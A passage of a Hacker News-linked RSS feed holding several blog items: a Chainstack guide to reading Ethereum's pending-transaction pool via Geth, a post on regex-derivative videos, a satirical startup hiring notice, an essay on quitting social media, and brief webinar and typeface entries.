arbitrage trades based on that.</li><li>Front running â€” you can automatically grab the existing pending transactions, simulate them to identify the potential profit if the transaction is executed, copy the transaction and swap the existing address with your own, and submit it with a higher miner fee so that your transaction gets executed on-chain before the one you are copying.</li><li>Doing a MEV â€” MEV stands for Miner Extractable Value, and it’s based on that miners are theoretically free to include any transactions in the blocks and/or reorder them. This is a variation of the front running where instead of submitting your transaction with a higher fee to the same pool you picked it from, you get it directly into a block through a miner and bypass the pool.</li></ul><p>To run any of the described scenarios, you need access to the Ethereum txpool, and you need the methods to retrieve the transactions from the txpool. While Chainstack has you covered with fast dedicated nodes for the former, this article focuses on all the ways you can look into the txpool.</p><h2>Retrieving pending transactions with Geth</h2><p>Since pending transactions are your targets in the txpool space, we are now going to make this a structured effort and focus on answering the following questions while accompanying the answers with practical examples:</p><ul><li>How do I retrieve pending transactions?</li><li>Why do I view global or local pending transactions?</li><li>Can I view global pending transactions without txpool namespace?</li></ul><p>There are a few ways to retrieve pending transactions.</p><ul><li>Filters</li><li>Subscriptions</li><li>Txpool API</li><li>GraphQL API</li></ul><p>Before we start, lets clarify a few things:</p><ul><li><strong>Global pending transactions</strong> refer to pending transactions that are happening globally, which includes your newly created local pending transactions.<br><strong>Local pending transactions</strong> refer strictly to the transactions that you created on your local node. Note that you need â€˜personalâ€™ namespace enabled for Geth to send local transactions.</li><li><strong>Pending transactions</strong> refer to transactions that are pending due to various reasons, like extremely low gas, out of order nonce, etc.</li><li>Chainstack is using <strong>Geth (Go Ethereum)</strong> client.</li></ul><h3>Filters</h3><p>When we create a filter on Geth, Geth will return a unique <code>filter_id</code>. Do note that this <code>filter_id</code> will only live for 5 minutes from the last query on that specific filter. If you query this filter after 5 minutes, the filter will not exist anymore.</p><h4>Creating a pending transaction filter and retrieving data from it</h4><h5>cURL</h5><p><strong>Create filter</strong></p><p>Request body:</p><pre><code>'{"jsonrpc":"2.0","method":"eth_newPendingTransactionFilter","params":[],"id":73}'</code></pre><p>Response body:</p><pre><code>{ "id":73, "jsonrpc": "2.0", "result": "0xb337f6e2f833ecffc6e9315ba06cd03d" }</code></pre><h5>Web3.js</h5><p>Filter for pending transactions is not supported anymore. Please use <a href="#subscriptions">Subscriptions</a>.</p><h5>Web3.py</h5><p><strong>Create filter</strong></p><pre><code>pending_transaction_filter= web3.eth.filter('pending')</code></pre><p><strong>Access filter</strong></p><pre><code>print(pending_transaction_filter.get_new_entries())</code></pre><h3>Common sources of confusion on filters</h3><h4>Web3.py and the pending argument</h4><p>Why does web3.py have their input arguments as <em>pending</em> instead of a dictionary which contains the usual filter parameters like <code>fromBlock</code>, <code>toBlock</code>, <code>address</code>, <code>topics</code>.</p><p>This is because Web3 does the mapping internally. If we look at the <a href="https://github.com/ethereum/web3.py/blob/72457e6f9f3cb6d51fe492d1a65bed7904639760/web3/eth.py#L474" target="_blank" rel="noreferrer noopener nofollow">web3.py source code</a>, when web3.py receives a string pending, it will be mapped to <code>eth_newPendingTransactionFilter</code>, and when web3.py receives a dictionary, it is mapped to <code>eth_newFilter</code>.</p><p>To add to this, web3.py has <code>get_new_entries</code> as well as <code>get_all_entries</code> for filters but <code>get_all_entries</code> does not work in our case. This is because <code>eth_newPendingTransactionFilter</code> does not have <code>get_all_entries</code> available for it.</p><h4>From latest block to pending block filter</h4><p>Why doesn’t the following filter give me real-time pending transactions?</p><pre><code>web3.eth.filter({'fromBlock': 'latest', 'toBlock': 'pending'})</code></pre><p>A filter only returns <code>new_entries()</code> when the state has changed. This specific filter state changes only when there is a new latest block or pending block. Thus, you will only receive changes when there is a new latest block or pending block, i.e. <code>(eth.getBlock('latest') / pending)</code>.</p><h4>The getPendingTransactions filter</h4><p>Why is the following giving me a different or empty result?</p><pre><code>web3.eth.getPendingTransactions().then(console.log)</code></pre><p>This function is mapped to <code>eth.pendingTransactions</code> which is a function to check local pending transactions and does not give you global transactions.</p><p>Based on the <a href="https://github.com/ethereum/go-ethereum/blob/ead814616c094331915b03edd82d4200a7880178/internal/ethapi/api.go#L1700" target="_blank" rel="noreferrer noopener nofollow">Geth source code</a>, only <code>pendingTransactions</code> that has its <code>from</code> field matching with your personal account will be shown.</p><h3 id="subscriptions">Subscriptions</h3><p>Subscriptions is real-time streaming of data from server to client through WebSocket. You will need a constantly active connection to stream such events. You cannot use curl for this and have to use a WebSocket client like <a href="https://github.com/vi/websocat" target="_blank" rel="noreferrer noopener nofollow">websocat</a> if you want to access it via command line. Once executed, a stream of pending transaction IDs will start flowing in.</p><p>For other supported subscriptions, check the Geth documentation: <a href="https://geth.ethereum.org/docs/rpc/pubsub#supported-subscriptions" target="_blank" rel="noreferrer noopener nofollow">Supported Subscriptions</a>.</p><h4>Creating a subscription</h4><h5>Websocat</h5><p><strong>Connect to node</strong></p><pre><code>websocat wss://username:<a href="https://chainstack.com/cdn-cgi/l/email-protection" data-cfemail="7000110303071f02143007035d1e145d4142435d4445465d4748495e0042001916095e131f1d">[email&nbsp;protected]</a></code></pre><p><strong>Create subscription</strong></p><p>Request body:</p><pre><code>{"id": 1, "method": "eth_subscribe", "params": ["newPendingTransactions"]}</code></pre><p>Response body:</p><pre><code>{"jsonrpc":"2.0","id":1,"result":"0x2d4f3eb938cdb0b6fa9052de7c4da5de"}</code></pre><p><strong>Incoming stream</strong></p><pre><code>{"jsonrpc":"2.0","method":"eth_subscription","params":{"subscription":"0x2d4f3eb938cdb0b6fa9052de7c4da5de","result":"0xee426dbaef2a432d0433d5de600347e97b6a8a855daf8765c18cf1b7efc53461"}}
...</code></pre><h3>Txpool API</h3><p>Txpool is a Geth-specific API namespace that keeps pending and queued transactions in the local memory pool. Geth’s default is 4096 pending and 1024 queued transactions. However, <a href="https://etherscan.io/txsPending" target="_blank" rel="noreferrer noopener nofollow">Etherescan reports</a> a much bigger number of pending transactions. If we view Geth’s txpool, we will not be able to get all of the transactions. Once the pool of 4096 is full, Geth replaces older pending values with newer pending transactions.</p><p>If you need a bigger pool to be stored on your node, the flag <code>--txpool.globalslots</code> can be adjusted to a higher value on <a href="https://geth.ethereum.org/docs/interface/command-line-options" target="_blank" rel="noreferrer noopener nofollow">Geth CLI options</a>. Do note that the larger the number, the bigger the payload size.</p><p>If you see your <code>txpool_status</code> to be empty, it can mean your node has not fully synced.</p><p>The txpool namespace is only supported on Chainstack dedicated nodes.</p><h4>Creating a txpool filter</h4><h5>cURL</h5><p><strong>Create filter</strong></p><p>Request body:</p><pre><code>{"jsonrpc":"2.0","method":"eth_newPendingTransactionFilter","params":[],"id":73}</code></pre><p>Response body:</p><pre><code>{ "jsonrpc": "2.0", "id": 73, "result": { "pending": {...}, "queued": {...} } }</code></pre><h5>Web3.js</h5><p><a href="https://web3js.readthedocs.io/en/v2.0.0-alpha/web3-eth-txpool.html" target="_blank" rel="noreferrer noopener">TxPool Module</a>.</p><h5>Web3.py</h5><p><a href="https://web3py.readthedocs.io/en/stable/web3.geth.html" target="_blank" rel="noreferrer noopener">Geth API</a>.</p><h3>GraphQL API</h3><p>The biggest advantage of <a href="https://chainstack.com/graphql-on-ethereum-availability-on-chainstack-and-a-quick-rundown/" target="_blank" rel="noreferrer noopener">using GraphQL</a> is that you can filter out the specific fields of the transaction that you want. The query in GraphQL goes through the elements within the txpool. Thus, its limitations are the same as the ones of txpool as stated above.</p><p>The following is an example which shows the information of a pending transaction.</p><p>Query example:</p><pre><code>query {
  pending {
    transactions {
      hash
      gas
      value
      gasPrice
      nonce
      r
      s
      v
      inputData
      status
      gasUsed
      cumulativeGasUsed
      from {
        address
      }
      to {
        address
      }
    }
  }
}</code></pre><p>GraphQL API is currently supported on Chainstack <a href="https://chainstack.com/pricing/" target="_blank" rel="noreferrer noopener">dedicated Ethereum nodes</a>.</p><p>I hope this blog serves you well in understanding the various ways of retrieving pending transactions.</p><h2>Additional resources</h2><ul><li><a href="https://web3js.readthedocs.io/en/v1.3.0/web3-eth.html" target="_blank" rel="noreferrer noopener nofollow">Web3.eth</a></li><li><a href="https://eth.wiki/json-rpc/API" target="_blank" rel="noreferrer noopener nofollow">Ethereum JSON-RPC API</a></li><li><a href="https://support.chainstack.com/hc/en-us/articles/900000820506-Checking-pending-and-queued-transactions-in-your-Ethereum-node-s-local-pool" target="_blank" rel="noreferrer noopener">Checking pending and queued transactions in your Ethereum node’s local pool</a></li><li><a href="https://support.chainstack.com/hc/en-us/articles/900003426246-Subscribing-to-global-new-pending-transactions" target="_blank" rel="noreferrer noopener">Subscribing to global new pending transactions</a></li></ul><h2>Join our community of innovators</h2><ul><li>To learn more about Chainstack, visit our <a href="https://docs.chainstack.com/" target="_blank" rel="noreferrer noopener">Knowledge Center</a> or join our <a href="https://gitter.im/chainstack/Lobby" target="_blank" rel="noreferrer noopener">Gitter Lobby</a>.</li><li>Sign up for a <a href="https://console.chainstack.com/user/account/create" target="_blank" rel="noreferrer noopener">free Developer account</a>, or explore the options offered by <a href="https://chainstack.com/pricing/" target="_blank" rel="noreferrer noopener">Growth or Business plans</a>.</li><li>Take a look at our pricing tiers using a <a href="https://chainstack.com/pricing/" target="_blank" rel="noreferrer noopener">handy calculator</a> to estimate usage and number of nodes.</li></ul><p>Have you already explored what you can achieve with Chainstack? <a rel="noreferrer noopener" href="https://console.chainstack.com/user/account/create" target="_blank">Get started for free today</a>.</p></div></div>]]>
            </description>
            <link>https://chainstack.com/exploring-the-methods-of-looking-into-ethereums-transaction-pool/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25524749</guid>
            <pubDate>Thu, 24 Dec 2020 03:15:20 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Three Great Videos About Regex Derivatives]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25524555">thread link</a>) | @todsacerdoti
<br/>
December 23, 2020 | http://www.oilshell.org/blog/2020/12/regex-videos.html | <a href="https://web.archive.org/web/*/http://www.oilshell.org/blog/2020/12/regex-videos.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
  <!-- INSERT LATCH HTML -->
<p><a href="http://www.oilshell.org/blog/">blog</a> | <a href="http://www.oilshell.org/">oilshell.org</a></p>

<p>
  2020-12-23
</p>
<p>I usually don't post videos here, but the first one in this series <a href="https://old.reddit.com/r/ProgrammingLanguages/comments/khec43/video_derivative_of_a_regex_brzozowski_derivative/">got a
positive reaction on Reddit</a>, and there are two more.</p>
<p>I've been interested in implementing simple and efficient <strong>regex matching</strong>
with the derivatives technique for a couple years. But I haven't had time to
play with code that implements it, or read the original papers more carefully.</p>
<p>These videos helped me understand the technique despite the fact I haven't
done math in over a decade.  Others apparently felt the same way.  The
explanation is simple but not dumbed down.</p>
 
<a name="context"></a>
<h2>Context</h2>
<p>For context, see the two July 2020 posts  tagged #<a href="http://www.oilshell.org/blog/tags.html?tag=eggex#eggex">eggex</a>,
particularly <a href="http://www.oilshell.org/blog/2020/07/ideas-questions.html#regular-expression-derivatives-papers-and-code">this part of the second post, on derivatives</a>.</p>
<p>Summary: A 2009 paper revived this regex matching technique.  There have been
many implementations since, though no popular ones.</p>
<a name="how-does-this-relate-to-shell"></a>
<h3>How Does This Relate to Shell?</h3>
<ul>
<li>As mentioned in those posts, a <strong>glob</strong> like <code>[a-c]*.py</code> is essentially a
limited form of regex.
<ul>
<li>I noted in <a href="https://news.ycombinator.com/item?id=25491467">this Hacker News comment</a> that the obscure
"extended glob" feature of bash gives globs the power of regular
expressions, by adding repetition and alternation.</li>
</ul>
</li>
<li>It would be nice if <a href="http://www.oilshell.org/cross-ref.html?tag=eggex#eggex">egg expressions</a> could be <strong>compiled</strong> to a
full DFA in C, as we do in <a href="http://www.oilshell.org/blog/tags.html?tag=lexing#lexing">Oil's lexer</a> via <a href="http://www.oilshell.org/cross-ref.html?tag=re2c#re2c">re2c</a>.
<ul>
<li>This seems doable, and the author of an <a href="https://github.com/jack-pappas/facio/tree/master/Reggie">F# compiler
toolkit</a> relays
valuable experience at the bottom of the thread.  I'd like to do the same
thing without the .NET runtime, depending only on code in Oil.</li>
</ul>
</li>
<li>It would be nice if <a href="http://www.oilshell.org/cross-ref.html?tag=eggex#eggex">egg expressions</a> weren't limited to the
features of the pattern matching engine in <a href="http://www.oilshell.org/cross-ref.html?tag=libc#libc">libc</a>.  Non-greedy
capturing like <code>foo.*?bar</code> would be nice, although capturing and matching are
two different problems.</li>
</ul>
<a name="easytheory-videos"></a>
<h2>EasyTheory Videos</h2>
<a name="derivative-of-a-regex-brzozowski-derivative"></a>
<h3>Derivative of a Regex?! (Brzozowski Derivative)</h3>
<p>This video explains what a derivative is using the recursive definition of
regular expressions.</p>
<iframe width="679" height="382" src="https://www.youtube.com/embed/s9EPoy9r-ok" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope;
picture-in-picture" allowfullscreen=""></iframe>

<a name="example"></a>
<h3>Example</h3>
<p>This one walks through an example of a regex and its derivative.</p>
<iframe width="679" height="382" src="https://www.youtube.com/embed/P9FtoOCZMDM?list=PLylTVsqZiRXN3Q86XJV6OWOmIzvVZs75E" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>

<a name="regex-to-dfa-directly-using-brzozowski-derivatives-no-nfa"></a>
<h3>Regex to DFA Directly Using Brzozowski Derivatives (No NFA)</h3>
<p>This one shows how to directly convert a regular expression to a DFA with
derivatives.  This is interesting because DFAs can be executed efficiently.
See the <a href="https://old.reddit.com/r/ProgrammingLanguages/comments/khec43/video_derivative_of_a_regex_brzozowski_derivative/">Reddit thread</a> for more color on this.</p>
<iframe width="679" height="382" src="https://www.youtube.com/embed/rcjR3--M7iM?list=PLylTVsqZiRXN3Q86XJV6OWOmIzvVZs75E" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>

<a name="why-call-this-operation-a-derivative"></a>
<h2>Why Call This Operation a Derivative?</h2>
<p>I don't know, and the videos don't explain it!  I assume there is some
connection between algebra and calculus.</p>
<p>The <a href="https://old.reddit.com/r/ProgrammingLanguages/comments/khec43/video_derivative_of_a_regex_brzozowski_derivative/">Reddit thread</a> has some speculation on this.  <a href="https://old.reddit.com/r/oilshell/comments/kj6svq/three_great_videos_about_regex_derivatives/?">Leave a
comment</a> if you have ideas.</p>
<p>I recently explained that <a href="https://old.reddit.com/r/ProgrammingLanguages/comments/k5yj4c/modern_parser_generator/geiew2e/">languages are sets, not algorithms</a>.
And MathOverflow says that <a href="https://math.stackexchange.com/a/1574197">derivatives can be expressed in set
theory</a>.  But I don't know if that's
a useful way to think about it.</p>
<a name="more-info"></a>
<h2>More Info</h2>
<ul>
<li>These videos are part of the <a href="https://www.youtube.com/c/EasyTheory/videos">EasyTheory
channel</a>, which started 9 months
ago, and has many videos that go deeply into the theory of computation.
<ul>
<li>Caveat: this is pure theory, and I'm mainly interested in <strong>engineering
consequences</strong>, like compiling with fewer lines of code and executing
efficiently.  Posts tagged #<a href="http://www.oilshell.org/blog/tags.html?tag=computer-science#computer-science">computer-science</a> explain other
such connections.</li>
</ul>
</li>
<li>Recent posts tagged #<a href="http://www.oilshell.org/blog/tags.html?tag=eggex#eggex">eggex</a>:
<ul>
<li><a href="http://www.oilshell.org/blog/2020/07/eggex-theory.html">Comments on Eggex and Regular
Languages</a> (July 2020)</li>
<li><a href="http://www.oilshell.org/blog/2020/07/ideas-questions.html">Regular Languages, Part 2: Ideas and
Questions</a> (July
2020).  This post contains the section with many links about regex
derivatives, also linked above.</li>
</ul>
</li>
</ul>
<p><strong>Ad</strong>: I'm looking for help with Oil, which is written in Python, shell, and
C++.  See our
<a href="https://github.com/oilshell/oil/blob/master/README.md">README.md</a>.</p>




</div>]]>
            </description>
            <link>http://www.oilshell.org/blog/2020/12/regex-videos.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25524555</guid>
            <pubDate>Thu, 24 Dec 2020 02:34:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[IMGZ Is Hiring]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25524534">thread link</a>) | @strogonoff
<br/>
December 23, 2020 | https://imgz.org/blog/2020/12/23/haha-suckers/ | <a href="https://web.archive.org/web/*/https://imgz.org/blog/2020/12/23/haha-suckers/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>
Posted on
<time itemprop="datePublished" datetime="2020-12-23">December 23, 2020</time>.
</p><div itemprop="articleBody"><p>A few weeks ago, we wrote a massively successful <a href="#">IMGZ systems architecture article</a> that ended up going viral (note to editor: are we still allowed to say "viral" in 2020?) and upending the world of image hosting.
Here we were, a small newcomer, poised to take on the giants of the multi-billion-dollar image hosting industry with our new, innovative and daring business model of charging people for services.</p>
<p>As you can imagine, all the media attention caused our user count to skyrocket, and our subscription graph started exhibiting the familiar "hockey stick" pattern that every VC in Silicon Valley wants to be hit with:</p>
<p><img src="https://imgz.org/iQYRKWrE.png" alt=""></p>
<p>Rather unsurprisingly, such an influx of new users caused a deluge of new content being uploaded to the platform. We estimate that, with our current level of usage, up to a thousand images could be getting uploaded to the service every year.</p>
<p>Naturally, we immediately sprang into action to preserve the reliability of our infrastructure, and quickly drew up a scaling plan that would enable the service to withstand its newfound popularity. This is where our foresight when designing the service paid off, as the hosting provider we use let us quickly perform the necessary changes and provision an extra gigabyte of disk space.</p>
<h2>One thing becomes clear</h2>
<p>However, one thing became clear: We could not sustain this breakneck pace for long by ourselves. This was never more obvious than a few days ago, when we realized we were close to failing to meet our uptime guarantee for 2020, and had to take the service offline for a few days to bring our uptime down to what we promised.</p>
<p>This event highlighted that there is just too much to do in a fledgling startup that aims to become the next MySpace, and even more to do in one that specifically wants to <em>avoid</em> becoming the next MySpace. If we were ever to realize the IMGZ vision and change the world, we needed more people.</p>
<h2>We're hiring!</h2>
<p>If you're young, passionate about creating software that changes the world and don't know what "3x investor preference" means, you're exactly who we're looking for! You have the opportunity to join an innovative, fast-growing company with a modern technology stack.</p>
<p>At IMGZ, we don't just want to serve images, no. The values of IMGZ are far loftier than that. At IMGZ we live and breathe images to the point where our values can only be communicated <strong>with</strong> an image:</p>
<p><img src="https://imgz.org/i9xyk2H2.png" alt=""></p>
<p>In talking with various prospective hires, one thing became abundantly clear: Nobody joins a startup for the money, they do it to get rich. With this in mind, we found the perfect balance of the "early startup employee" compensation package: 50% stock, 50% equity, 0% salary.</p>
<p>That's right! We can maximize the potential of your stock by doing away with a significant company expense: Employee salaries. This way, your stock is much more likely to be worth a lot more (and you have a lot of it, since our packages start at three trillion shares per employee! That's a big number).</p>
<p>Everyone we discussed this with loved the approach, and it makes intuitive sense: Name one Google employee who became a millionaire from their salary. We bet you can't, yet all of us know the name of that cleaning lady who was given Google stock and now she has "VC" on her CV, you know the one we're talking about.</p>
<h2>Interview process</h2>
<p>Like any self-respecting Silicon Valley startup, we can't just settle for any old 10x rockstar developer who wants to join. Firing people is expensive, you know? That is why we have prepared a thorough, six-stage interview process.</p>
<p>We pride ourselves on being a pragmatic, practice-driven development team, and we want to see how you perfom in real-world scenarios, so you will be given a feature from our product roadmap and will be asked to develop it to your satisfaction. Afterwards, we will use this feature in our product and see how users like it. If they do, that will be a point in your favor.</p>
<p>Of course, we can't really know if you developed the feature yourself or paid someone on Fiverr to do it for you, so for the next stage of the interview we will ask you to invert a data structure on a whiteboard. None of us knows how or cares enough about what you're doing, so we'll pretend to not like random things about your solution until you're on the verge of tears, to evaluate how you fare against the ever-changing requirements that come with bad leadership.</p>
<p>If you pass the whiteboard interviews without cracking, we'll introduce you to everyone on the team, making sure you have at least eight hours of one-on-one time with various staff members, often more than once. This is just so we get to know you better and see what you're like in social situations.</p>
<p>After wasting a few days of your time and ours, we'll finally adjourn and haphazardly email each other about you, mostly trying to remember which applicant you were from flaws in your appearance. We'll then round up all the notes and observations from your technical interviews and summarize everything we know about you into one list.</p>
<p>For the final decision, we'll look at the list and evaluate you purely on your technical merits, trying to confirm the judgment that we've already subconsciously formed based on how much you are like us. If you are too different, we're sorry, no matter how good you are technically, we'll pass. In this company, we value one thing above all others: Diversity.</p>
<h2>Apply today!</h2>
<p>If the above sounds appealing, excellent! Reach out to us at <a href="https://www.youtube.com/watch?v=dQw4w9WgXcQ"><span data-cfemail="b9d1d0cbd0d7def9d0d4dec397dad6d4">[email&nbsp;protected]</span></a> to get the ball rolling, and you might soon be "working" for the best image host in the world, IMGZ!</p>
</div></div>]]>
            </description>
            <link>https://imgz.org/blog/2020/12/23/haha-suckers/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25524534</guid>
            <pubDate>Thu, 24 Dec 2020 02:29:03 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Social Media Considered Harmful]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25524429">thread link</a>) | @maraoz
<br/>
December 23, 2020 | https://maraoz.com/2020/12/23/bye-social-media/ | <a href="https://web.archive.org/web/*/https://maraoz.com/2020/12/23/bye-social-media/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <div>
        <div>

  

  <article>
    <p><img src="https://maraoz.com/img/bye-social-media/cover.jpg"></p>

<p><span>N</span>ot long ago, we lived in small hunter-gatherer tribes. Social skills evolved along our abilities to use physical tools and language. We spent our days hunting or foraging our food, and had plenty of free time to ponder life. Our survival was dependent upon our social skills. We were rewarded (by the fruits of cooperation) for having friends and social support, and killed (mostly by hunger or predators) if we were antisocial. Our brains developed to be very sensitive to social interactions. The ability to read other’s emotions, give them importance, and respond to them is a part of our hard-wired social brain. It also takes a lot of mental energy.</p>

<p>In the early days of social media, I was (as is usual with me) an avid promoter and ethusiast. Social media is just <em>amazing</em> for so many things: exploring ideas, being up to date with many topics, connecting with tons of people. Social media helped me bootstrap my professional life, and meet some of the most amazing people. However, I’ve now come to believe that in a couple of years, most people will view using social media as unhealthy, like we do today with smoking. We might need to find better ways to get these benefits withtout the costs.</p>

<p>I stopped using Facebook ~3 years ago, and Instagram ~2 years ago. My online life has been much better since. My offline life too. Today (actually,&nbsp;a month ago), I left Twitter. The costs are simply too high for me. I noticed the less I use any of those apps, the calmer my mind, the more I read, and the more time I spend outside, in real contact with other people and nature. These are things I value more than instant access to news and daily contact with thousands of people at this time.</p>

<p>It is very hard to argue that social media is not harmful for most. We are simply not made to continually know what everyone else is doing or thinking, all the time! And it’s not a neutral tech. It is actively addictive and destructive to our volition. Most of the people I’ve talked to say they’d like to use these apps less. Yet somehow they don’t. Our brains are wired to pay attention to each other and to care about what others think about us. Social media is designed to exploit both these things. It is engineered to hook us in, and to influence our behavior. That’s the product Facebook, Instagram and Twitter sell to their customers: changing your ideas and behavior. And they got some pretty talented people working on that.</p>

<p>I don’t really think I can convince anyone to leave social media. I don’t even think it’s bad for everyone or that the benefits can’t outweigh the costs for some. I’m writing this post because many of you will already be close to leaving one of these apps. You’ve been thinking about it already. You’ve already made up your mind about it, and you’re waiting for the right moment. If just one person makes the final step into at least <em>trying</em> to live without social media, I’ll be happy.&nbsp;It has made a huge change for me. If you think this is stupid or I don’t understand the beauty of the Internet, I think you’ll change your mind in a few years. Or social media will ;)</p>

<p>If you do leave social media, feel free to contact me after a couple of months to share experiences. It’s been amazing for me, and I’m not going back. I’m really interested in knowing more about how this change can affect other people’s life. I’m also curious to find new ways to stay in touch with people outside my local community which are less toxic to my mind.</p>

<p>To close this brief post, I’ll share a bold prediction (and hope) on this topic: Facebook, Instagram, and Twitter will have less monthly active users in 2025 than today (~2.6 billion, ~1 billion, ~330 million, respectively). I added this to my <a href="https://maraoz.com/2016/03/20/2026/">predictions for 2026 post</a>.</p>

<h3 id="additional-resources-and-learning">Additional Resources and Learning</h3>
<ul>
  <li><a href="https://www.ted.com/talks/cal_newport_why_you_should_quit_social_media?language=en">Cal Newport’s talk on “Why you should quit social media”</a>. Watching this was the first time I seriously considered quitting it forever.</li>
  <li><a href="https://www.imdb.com/title/tt11464826/">The Social Dilemma documentary</a>. Available on Netflix.</li>
  <li><a href="https://www.imdb.com/title/tt5962210/">Ingrid Goes West movie</a>. Thanks Vera!</li>
  <li><a href="https://www.youtube.com/watch?v=Czg_9C7gw0o">“Is Social Media Hurting Your Mental Health?” talk by Bailey Parnell</a>.</li>
  <li><a href="https://www.imdb.com/title/tt5497778/">Black Mirror’s “Nosedive” episode</a>.</li>
  <li><a href="https://www.youtube.com/watch?v=gM3KIvZO5oU">“What I learned from my social media fast” talk by Amber Quinney</a>.</li>
  <li><a href="https://www.youtube.com/watch?v=pOchBnZJdEk">“Live in the Moment: Delete Social Media” talk by Ryan Thomas</a></li>
</ul>

<h3 id="acknowledgements">Acknowledgements</h3>

<p><span>Cover photo by <a href="https://unsplash.com/@milo_contreras?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText">Camilo Contreras</a> on <a href="https://unsplash.com/?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText">Unsplash</a></span></p>

<h3 id="comments-and-discussion">Comments and Discussion</h3>
<p><a href="https://news.ycombinator.com/item?id=25524429">Discuss on HN</a> - <a href="https://www.reddit.com/r/simpleliving/comments/kj6j15/social_media_considered_harmful/">Discuss on Reddit</a> - <a href="https://maraoz.com/cdn-cgi/l/email-protection#7b19021e56081418121a1756161e1f121a3b161a091a140155181416">Email a private comment</a></p>

  </article>
  

</div>

      </div>
    </div></div>]]>
            </description>
            <link>https://maraoz.com/2020/12/23/bye-social-media/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25524429</guid>
            <pubDate>Thu, 24 Dec 2020 02:04:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Fabbrica: A sans serif typeface with a utilitarian aesthetic]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25524216">thread link</a>) | @kmckiern
<br/>
December 23, 2020 | https://www.cinetype.com/fabbrica | <a href="https://web.archive.org/web/*/https://www.cinetype.com/fabbrica">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.cinetype.com/fabbrica</link>
            <guid isPermaLink="false">hacker-news-small-sites-25524216</guid>
            <pubDate>Thu, 24 Dec 2020 01:16:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Machine learning for K8s logs and metrics]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25524161">thread link</a>) | @gdcohen
<br/>
December 23, 2020 | https://www.cncf.io/webinars/machine-learning-for-k8s-logs-and-metrics/ | <a href="https://web.archive.org/web/*/https://www.cncf.io/webinars/machine-learning-for-k8s-logs-and-metrics/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

			
			
<p>There are many great tools for logs and metrics in the K8s ecosystem, but when there’s a problem, skilled SREs and developers still spend a lot of time searching through logs and dashboards to find root cause. The underlying challenge is the near infinite number of possible failure modes in distributed applications.</p>



<p>Now, imagine a machine learning system that could uncover root cause just by watching a feed of logs and metrics? And imagine if it didn’t require any training or setup? In this webinar, we will discuss a number of machine learning techniques for logs and metrics and then demonstrate what this looks like in real life. Spoiler alert: ML really can detect problems and their root cause unaided!</p>



<p>Presented by:</p>



<p>Larry Lancaster, Founder and CTO&nbsp;@Zebrium</p>





			
		</div></div>]]>
            </description>
            <link>https://www.cncf.io/webinars/machine-learning-for-k8s-logs-and-metrics/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25524161</guid>
            <pubDate>Thu, 24 Dec 2020 01:07:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What Is a Pedagogic IDE?]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25524045">thread link</a>) | @azhenley
<br/>
December 23, 2020 | https://parentheticallyspeaking.org/articles/pedagogic-ide/ | <a href="https://web.archive.org/web/*/https://parentheticallyspeaking.org/articles/pedagogic-ide/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><table><tbody><tr><td><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><a href="#%28part._.At_the_.Beginning%29" data-pltdoc="x">1<span>&nbsp;</span>At the Beginning</a></p></td></tr><tr><td></td></tr><tr><td><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><a href="#%28part._.More_.Insights%29" data-pltdoc="x">2<span>&nbsp;</span>More Insights</a></p></td></tr><tr><td></td></tr><tr><td><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><a href="#%28part._.More_.About_.Feedback%29" data-pltdoc="x">3<span>&nbsp;</span>More About Feedback</a></p></td></tr><tr><td></td></tr><tr><td><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><a href="#%28part._.Ground_.Truth%29" data-pltdoc="x">4<span>&nbsp;</span>Ground Truth</a></p></td></tr><tr><td></td></tr><tr><td><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><a href="#%28part._.How_.Can_.We_.Use_.Ground_.Truth_%29" data-pltdoc="x">5<span>&nbsp;</span>How Can We Use Ground Truth?</a></p></td></tr><tr><td></td></tr><tr><td><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><a href="#%28part._.Multiple_.Artifacts%29" data-pltdoc="x">6<span>&nbsp;</span>Multiple Artifacts</a></p></td></tr><tr><td></td></tr><tr><td><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><a href="#%28part._.Comparison_is_.Hard%29" data-pltdoc="x">7<span>&nbsp;</span>Comparison is 